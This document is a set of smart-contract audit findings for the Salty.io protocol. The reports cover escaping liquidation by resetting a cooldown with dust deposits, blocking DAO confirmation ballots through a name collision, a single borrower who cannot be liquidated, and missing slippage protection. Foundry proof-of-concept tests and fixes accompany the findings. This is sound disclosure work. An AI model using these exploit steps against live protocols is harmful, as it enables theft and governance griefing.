# [HIGH-05] USDS borrowers can escape liquidation infinitely

 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L154 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L104-L111
 
 ## Impact
 USDS borrowers that should be liquidated can exploit the coolDown mechanism to prevent successful liquidations at practically no cost and for an infinite amount of time.
 
 ## Vulnerability details
 USDS borrowers can deposit or withdraw collateral in the protocol using the `depositCollateralAndIncreaseShare` & `withdrawCollateralAndClaim` methods inside `CollateralAndLiquidity.sol` contract. Both of those methods along with the `liquidateUser` method of the same contract internally call `_increaseUserShare` & `_decreaseUserShare`, which implement a coolDown mechanism, that snapshots the last time a user has deposited/withdrawn collateral and blocks new movements for some time (1-6 hours).
 
 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/staking/StakingRewards.sol#L104-L111
 
 ```solidity
 // the check inside _increaseUserShare()/_decreaseUserShare() 
 ....
 
 // this is passed as a function parameter
  if (useCooldown)
             if (
                 msg.sender != address(exchangeConfig.dao())
             ) // DAO doesn't use the cooldown
             {
                 require(
                     block.timestamp >= user.cooldownExpiration,
                     "Must wait for the cooldown to expire"
                 );
 
                 // Update the cooldown expiration for future transactions
                 user.cooldownExpiration =
                     block.timestamp +
                     stakingConfig.modificationCooldown();
             }
 
 ....
 ```
 
 The exploitable case occurs inside `CollateralAndLiquidity.liquidateUser()` which can be called by anyone to liquidate an insolvent borrower. Problem is that the function calls `_decreaseUserShare` with the coolDown flag set to `true`, which makes it dependent on the last coolDown set for that borrower.
 
 ```solidity
   function liquidateUser(address wallet) external nonReentrant {
    ....
    
     // Decrease the user's share of collateral as it has been liquidated and they 
         no longer have it.
         _decreaseUserShare(
             wallet,
             collateralPoolID,
             userCollateralAmount,
            // useCooldown
             true   <----- checks if coolDown has expired
         );
    ....
   }
 ```
 
 Since the borrower can reset his cooldown by depositing/withdrawing he can quite easily deposit a minimum amount of wei before each liquidation call which will make `liquidateUser()` revert because the coolDown is not expired
 
 Since the minimum deposit amount is 100 wei, it wouldn't cost the borrower anything to deposit a dust amount and reset his cooldown.
 
 I've calculated that for a default cooldown period of 1 hour it would cost the borrower 0.000000000000145642 $ (or practically nothing) to block liquidation for a period of 30 days. Considering the coolDown period can be increased to 6 hours the cost would be even lower - about x6 lower.
 
 Below I've coded a POC to prove all of this
 
 ## Proof of Concept
 Add this test to CollateralAndLiquidity.t.sol and run `forge test --rpc-url "https://rpc.sepolia.org/" --contracts src/stable/tests/CollateralAndLiquidity.t.sol --mt testPreventLiquidation -v`
 
 Here is a breakdown of the POC:
 
 * Alice(the bad borrower) deposits collateral and borrows USDS
 * The collateral ratio drops below the liquidation threshold
 * Bob wants the 5% reward for calling liquidation and goes for it
 * But Alice is monitoring the mempool and front-runs him by depositing a dust amount of collateral, resetting her coolDown timer and preventing Bob from successfully liquidating her
 * After that I've also provided an example of how Alice could block liquidations for an extended period of time (even without watching the mempool) by simply depositing small amount at regular intervals, so that her coolDown never expires. All that at almost no cost.
 
 ```solidity
 function testPreventLiquidation() public {
         // 0. Bob deposits collateral so alice can be liquidated
         vm.startPrank(bob);
         collateralAndLiquidity.depositCollateralAndIncreaseShare(
             wbtc.balanceOf(bob),
             weth.balanceOf(bob),
             0,
             block.timestamp,
             false
         );
         vm.stopPrank();
 
         // 1. Alice deposits some collateral
         vm.startPrank(alice);
         uint256 wbtcDeposit = wbtc.balanceOf(alice) / 4;
         uint256 wethDeposit = weth.balanceOf(alice) / 4;
 
         collateralAndLiquidity.depositCollateralAndIncreaseShare(
             wbtcDeposit,
             wethDeposit,
             0,
             block.timestamp,
             true
         );
 
         // 2. Alice borrows USDS
         uint256 maxBorrowable = collateralAndLiquidity.maxBorrowableUSDS(alice);
         collateralAndLiquidity.borrowUSDS(maxBorrowable);
         vm.stopPrank();
 
         // 3. Time passes and collateral price crashes
         vm.warp(block.timestamp + 1 days);
         // Crash the collateral price so Alice's position can be liquidated
         _crashCollateralPrice();
 
         assertTrue(_userHasCollateral(alice));
 
         // 4. Alice prevents Bob liquidating her, by reseting coolDown period
         vm.prank(alice);
         collateralAndLiquidity.depositCollateralAndIncreaseShare(
             101 wei, // dust amount
             101 wei, // dust amount
             0,
             block.timestamp + 1 hours,
             false
         );
 
         // 5. Bob fails to liquidate Alice position
         vm.prank(bob);
         vm.expectRevert("Must wait for the cooldown to expire");
         collateralAndLiquidity.liquidateUser(alice);
 
         // Alice still has her collateral
         assertTrue(_userHasCollateral(alice));
 
         // Alice can block liquidation indefinitely
         assertEq(stakingConfig.modificationCooldown(), 1 hours);
         uint256 coolDown = 1 hours;
         // block liqudation for 30 days
         uint256 hoursIn30Days = 30 days / 1 hours;
         uint256 costToBlock;
 
         // deposit dust amount every 1 hour to reset cooldown and prevent liqudation
         for (uint256 i = 0; i <= hoursIn30Days; i++) {
             // Cooldown expires
             vm.warp(block.timestamp + 1 hours);
 
             // But Alice resets it
             vm.prank(alice);
             collateralAndLiquidity.depositCollateralAndIncreaseShare(
                 101 wei, // dust amount
                 101 wei, // dust amount
                 0,
                 block.timestamp + 1 hours,
                 false
             );
 
             // bob fails to liquidate again and again
             vm.prank(bob);
             vm.expectRevert("Must wait for the cooldown to expire");
             collateralAndLiquidity.liquidateUser(alice);
 
             // Alice still has her collateral
             assertTrue(_userHasCollateral(alice));
 
             //accumulate to the final cost
             costToBlock += 2 * 101 wei;
         }
 
         // 0.000000000000145642 dollars
         assertEq(costToBlock, 145642 wei);
     }
 ```
 
 ## Tools Used
 Manual review, Foundry
 
 ## Recommended Mitigation Steps
 Inside `CollateralAndLiquidity.liquidateUser()` when calling `_decreaseUserShare()` change the useCooldown argument to false, so that it cannot be influenced by user deposits
 
 ```solidity
   function liquidateUser(address wallet) external nonReentrant {
    ....
    
     // Decrease the user's share of collateral as it has been liquidated and they 
         no longer have it.
         _decreaseUserShare(
             wallet,
             collateralPoolID,
             userCollateralAmount,
            // useCooldown
             true   <----- change this to false
         );
    ....
   }
 ```
 
 ## Assessed type
 Invalid Validation



# [MEDIUM-04] USDS borrower cannot be liquidated if he is the only borrower in the pool

 # Lines of code
 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L140 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/Pools.sol#L187
 
 ## Impact
 Pools prevent withdrawals that will leave their reserves with dust amounts (too small amounts). However this creates a scenario in which a borrower with bad debt cannot be liquidated if he is the only borrower in the collateral pool.
 
 ## Vulnerability Details
 On every withdrawal of liquidity from the collateral pool the following validation is executed:
 
 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/Pools.sol#L187
 
 ```solidity
          // Make sure that removing liquidity doesn't drive either of the 
             reserves below DUST.
         // This is to ensure that ratios remain relatively constant even after a 
            maximum withdrawal.
         require(
             (reserves.reserve0 >= PoolUtils.DUST) &&
                 (reserves.reserve0 >= PoolUtils.DUST),
             "Insufficient reserves after liquidity removal"
         );
 ```
 
 The withdrawal happens by calling the `removeLiquidity()` method of the `Pools.sol` contract.
 
 And the function to liquidate a user is `liquidateUser` inside `CollateralAndLiquidity.sol` contract:
 
 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L140
 
 ```solidity
  function liquidateUser(address wallet) external nonReentrant {
        ....
 
         // First, make sure that the user's collateral ratio is below the 
            required level
         require(canUserBeLiquidated(wallet), "User cannot be liquidated");
 
         uint256 userCollateralAmount = userShareForPool(
             wallet,
             collateralPoolID
         );
 
         // Withdraw the liquidated collateral from the liquidity pool.
         (uint256 reclaimedWBTC, uint256 reclaimedWETH) = pools.removeLiquidity(
             wbtc,
             weth,
             userCollateralAmount,
             //@audit - can this be meved
             0,
             0,
             totalShares[collateralPoolID]
         );
      
       ....
        
     }
 ```
 
 As you can see `liquidateUser()` calls `pools.removeLiquidity()` method, which as explained above will revert if the reserves are left with dust or 0 amounts.
 
 This is where the bug lies. If there is only one borrower in the pool and he should be liquidated, calling `pools.removeLiquidity()` will fail. This is because `liquidateUser()` tries to withdrawal all of the borrower's collateral, which is the whole liquidity inside the pool. And since this will leave the pool empty it will fail the dust amount validation
 
 Now I know the situation can be remediated by depositing additional collateral that would cover the dust amount. This however does not compensate for the sub-optimal logic of the liquidation function.
 
 When a borrower's position goes underwater, liquidators should be able to slash his collateral at any time. This is the idea of liquidation - penalizing bad debts and preventing losses in a timely manner
 
 A much better solution would be to substract the dust amount(a VERY small amount) from the position (which might be very big) and liquidate the position momentarily.
 
 Imagine a scenario where a borrower has borrowed 1 million USDS against 2 million worth of collateral (200% collateral ratio) and he could not be liquidated because of `100 wei` that should be left in the pool
 
 This clearly distorts the normal functioning of the liquidation flow inside the protocol, but since measures could be taken to fix it I'm assigning this a medium severity
 
 ## POC
 You can add this test to `CollateralAndLiquidity.t.sol` and run `forge test --rpc-url "https://rpc.sepolia.org/" --contracts src/stable/tests/CollateralAndLiquidity.t.sol --mt testSingleBorrowerLiquidation `
 
 ```solidity
 function testSingleBorrowerLiquidation() public {
         // 1. Alice deposits collateral
         vm.startPrank(alice);
         uint256 wbtcDeposit = wbtc.balanceOf(alice);
         uint256 wethDeposit = weth.balanceOf(alice);
 
         collateralAndLiquidity.depositCollateralAndIncreaseShare(
             wbtcDeposit,
             wethDeposit,
             0,
             block.timestamp,
             true
         );
 
         // 2. Alice borrows USDS
         uint256 maxBorrowable = collateralAndLiquidity.maxBorrowableUSDS(alice);
         collateralAndLiquidity.borrowUSDS(maxBorrowable);
         vm.stopPrank();
 
         // 3. Time passes and collateral price crashes
         vm.warp(block.timestamp + 1 days);
         // Crash the collateral price so Alice's position can be liquidated
         _crashCollateralPrice();
 
         assertTrue(_userHasCollateral(alice));
 
         // 4. Bob fails to liquidate Alice position
         vm.prank(bob);
         vm.expectRevert("Insufficient reserves after liquidity removal");
         collateralAndLiquidity.liquidateUser(alice);
 
         // Alice still has her collateral
         assertTrue(_userHasCollateral(alice));
     }
 ```
 
 ## Tools Used
 Manual review
 
 ## Recommended Mitigation Steps
 When calling `pools.removeLiquidity()` inside `liquidateUser()` consider checking the reserves of the collateral pool and if necessary substract the dust amount from the `userCollateralAmount` so that he can effectively be liquidated
 
 ## Assessed type
 Other



# [MEDIUM-13] DAO can be permanently blocked from updating priceFeed and AccessManager contracts
 # Lines of code
 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L102-L103 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L240 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L203-L208
 
 ## Impact
 Every proposal creates a ballot that should have a unique name, so that subsequent ballots with the same name cannot be created. There is an exploitable case in the protocol that allows a new proposer to block finalization of a previously approved `SET_CONTRACT` ballot and effectively blocking the DAO from changing the `priceFeed/accessManager` contracts.
 
 It's also absolutely possible to permanently block the DAO from creating/executing proposals to update price feeds and access manager contracts - which are critical to the proper functioning of the protocol
 
 ## Proof of Concept
 Users that have staked more than the `requiredXSalt` can make proposals(ballots) to be voted by the other members of the DAO. Each created ballot has a name that has to be unique.
 
 This is the check being made before each proposal creation (`Proposals._possiblyCreateProposal()`)
 
 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/Proposals.sol#L102-L103
 
 ```
    // Make sure that a proposal of the same name is not already open for the ballot
         require(
             openBallotsByName[ballotName] == 0,
             "Cannot create a proposal similar to a ballot that is still open"
         );
         require(
             openBallotsByName[string.concat(ballotName, "_confirm")] == 0,
             "Cannot create a proposal for a ballot with a secondary confirmation"
         );
 ```
 
 Normally when a proposal is approved it is finalized and executed directly.
 
 There is an exception to this for 2 types of proposals :
 
 * proposals to set new contract(`Proposals.proposeSetContractAddress()`)
 * proposals to set new website (`Proposals.proposeWebsiteUpdate()`).
 
 For the POC I'm gonna focus on the `setContract` case because it is the more severe one.
 
 When any of those 2 gets approved a secondary confirmation proposal is created by the DAO as a safety measure (`to prevent surprise last-minute approvals` - as stated by the docs) which should be voted again and only then the proposal gets executed.
 
 Once the initial proposal is approved, this is how the confirmation proposal gets created inside `DAO.sol`:
 
 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/dao/DAO.sol#L203-L208
 
 ```solidity
 function _executeApproval(Ballot memory ballot) internal {
    ..... 
    
     // Once an initial setContract proposal passes, it automatically starts a second confirmation ballot (to prevent last minute approvals)
         else if (ballot.ballotType == BallotType.SET_CONTRACT)
             proposals.createConfirmationProposal(
                 string.concat(ballot.ballotName, "_confirm"), <------------------
                 BallotType.CONFIRM_SET_CONTRACT,
                 ballot.address1,
                 "",
                 ballot.description
             );
 
             // Once an initial setWebsiteURL proposal passes, it automatically starts a second confirmation ballot (to prevent last minute approvals)
         else if (ballot.ballotType == BallotType.SET_WEBSITE_URL)
             proposals.createConfirmationProposal(
                 string.concat(ballot.ballotName, "_confirm"), <-------------------
                 BallotType.CONFIRM_SET_WEBSITE_URL,
                 address(0),
                 ballot.string1,
                 ballot.description
             );
    ....
 
 }
 ```
 
 As you can see the name of the ballot for the secondary confirmation proposal is the name of the original ballot + `_confirm` -> `string.concat(ballot.ballotName, "_confirm"`.
 
 This is where the actual vulnerability lies. Someone can create a `setContract` proposal with the name of the secondary confirmation ballot and thus block the confirmation proposal from being created
 
 Here is a simple scenario:
 
 1. `Alice` calls `proposeSetContractAddress()` with contractName parameter as `priceFeed1` (creating a proposal to change the contract for the 1st price feed)
 2. The proposal gets enough votes and is ready to be finalized (the 1st stage) and enter it's 2nd stage (the DAO creating a secondary confirmation proposal)
 3. `Bob` decides to act maliciously and block Alice's proposal from reaching the 2nd stage and eventually being executed. How:
 
 * Just before Alice calls `DAO.finalizeBallot()` Bob calls `Proposals.proposeSetContractAddress()` with contractName as `priceFeed1_confirm` (the name that the DAO will set for Alice secondary ballot)
 
 4. Alice calls `finalizeBallot()` but it reverts. Why:
 
 * The creation of the secondary ballot with name `priceFeed1_confirm` fails the unique name checks, because Bob created another proposal with that name.
 
 You can add the following test to `DAO.t.sol` and run `forge test --rpc-url "https://rpc.sepolia.org/" --contracts src/dao/tests/Dao.t.sol --mt testBlockSetContractFinalization`
 
 ```solidity
     function testBlockSetContractFinalization() public {
         // transfer bob SALT
         vm.prank(DEPLOYER);
         salt.transfer(bob, 5000000 ether);
 
         // Alice creates a proposal to set contract
         vm.startPrank(alice);
         staking.stakeSALT(5000000 ether);
         uint256 ballotID = proposals.proposeSetContractAddress(
             "priceFeed1",
             address(0x1231236),
             "description"
         );
 
         // Proposal gets enough votes and is ready to be finalized
         proposals.castVote(ballotID, Vote.YES);
         // Increase block time to finalize the ballot
         vm.warp(block.timestamp + 11 days);
 
         vm.stopPrank();
 
         // Bob create a new proposal before finalization
         // with Alice ballot contractName + _confirm
         vm.startPrank(bob);
         salt.approve(address(staking), type(uint256).max);
         staking.stakeSALT(5000000 ether);
         proposals.proposeSetContractAddress(
             string.concat("priceFeed1", "_confirm"),
             address(0x1231237),
             "description"
         );
         vm.stopPrank();
 
         // The confirmation ballot will fail to be created, because bob blocked it
         vm.startPrank(alice);
         vm.expectRevert(
             "Cannot create a proposal similar to a ballot that is still open"
         );
         dao.finalizeBallot(ballotID);
         vm.stopPrank();
     }
 ```
 
 Finally I'm analyzing the situation to prove that the bug can be quite severe for the protocol:
 
 * We have a valid approved proposal to change the contract for `priceFeed1`, which cannot be finalized
 * This means no new proposals can be created for `priceFeed1`, until the currently one is finalized
 * Proposals do NOT have deadlines (like in other DAOs) which means the above proposal can stay like that forever(and block new proposals forever)
 * The only solution would be to generate enough _NO_ votes for the approved proposal, so that when calling `finalizeBallot()`, the protocol will fail the `proposals.ballotIsApproved(ballotID)` check and finalize it without creating secondary proposal
 * And if the proposal was voted _YES_ by too many people, convincing enough stakers to change their vote to _NO_ would be quite a challenging and consuming task, which is not quite clear if it will succeed.
 * And now imagine this is done for all 4 contracts that can be updated - `priceFeed1`, `priceFeed2`, `priceFeed3`, `accessManager`. The DAO will not be able to set new contracts for those vital components of the protocol
 
 The only requirement to take advantage of the exploit is to have enough staked Salt, which makes it quite easy to execute. Considering the impact it will have I think this can be categorised as high/crit.
 
 ## Tools Used
 Manual review, Foundry
 
 ## Recommended Mitigation Steps
 Inside the `Proposals._possiblyCreateProposal()` you can add a check that restricts ballotNames ending in "_confirm" only to confirmation proposals (which are created only by the DAO)
 
 ## Assessed type
 Governance


# [MEDIUM-26] Lack of slippage protection during liquidation creates a risk for collateral pool stability

 # Lines of code
 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L151
 
 ## Impact
 When users are liquidated no slippage protection and deadline is set. This exposes liquidations to front-running attacks, which will generate losses for the protocol because it will withdrawal much lower collateral than it should
 
 ## Proof of Concept
 `CollateralAndLiquidity.liquidateUser()` is called when a user has to be liquidated. That function calls internally `Pools.removeLiquidity()`:
 
 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/stable/CollateralAndLiquidity.sol#L140
 
 ```solidity
  function liquidateUser(address wallet) external nonReentrant {
         
       ....
 
         // First, make sure that the user's collateral ratio is below the required level
         require(canUserBeLiquidated(wallet), "User cannot be liquidated");
 
         uint256 userCollateralAmount = userShareForPool(
             wallet,
             collateralPoolID
         );
 
         // Withdraw the liquidated collateral from the liquidity pool.
         (uint256 reclaimedWBTC, uint256 reclaimedWETH) = pools.removeLiquidity(
             wbtc,
             weth,
             userCollateralAmount,
             0,                      <-------------- NO slippage token1
             0,                      <-------------- NO slippage token2
             totalShares[collateralPoolID]
         );
 
      ....
 
     }
 ```
 
 As you can see above the function does not specify `minReclaimedA`, `minReclaimedB` parameter of `removeLiquidity()`:
 
 https://github.com/code-423n4/2024-01-salty/blob/53516c2cdfdfacb662cdea6417c52f23c94d5b5b/src/pools/Pools.sol#L170
 
 ```solidity
  function removeLiquidity(
         IERC20 tokenA,
         IERC20 tokenB,
         uint256 liquidityToRemove,
         uint256 minReclaimedA,
         uint256 minReclaimedB,
         uint256 totalLiquidity
     ) external nonReentrant returns (uint256 reclaimedA, uint256 reclaimedB) {
 ....
 }
 ```
 
 This makes it quite easy for a MEV bot to sandwich the liquidation transaction and profit at the expense of the protocol.
 
 Another thing that is not ok is that `removeLiquidity()` does not use any deadline parameter. This effectively means that the liquidation transaction could be kept in the mempool for any amount of time to be executed at a later time when profit will be best.
 
 I want to point out here that the atomic arbitrage which protects swaps in the protocol from the above mentioned MEV exploits is valid ONLY for swaps. During deposits/withdrawals of liquidity inside pool no arbitrage is conducted and hence they are open to MEV exploatations, that's why I'm specifically focusing on withdraws here.
 
 The end result is that the borrower collateral that should compensate for the USDS that was not returned will be `stolen` by advantageous parties. This in turn can compromise the stability of the system, because overcollaterization and proper liquidation mechanisms are the center pillar of any borrowing protocol, that keeps it from collapsing
 
 ## Tools Used
 Manual review
 
 ## Recommended Mitigation Steps
 Consider adding a configurable minimum percent that should be recovered from the collateral after liquidation. Also add a deadline parameter to ensure liquidations are executed in a timely manner
 
 ## Assessed type
 MEV

 # QA Report

 https://github.com/code-423n4/2024-01-salty-findings/issues/328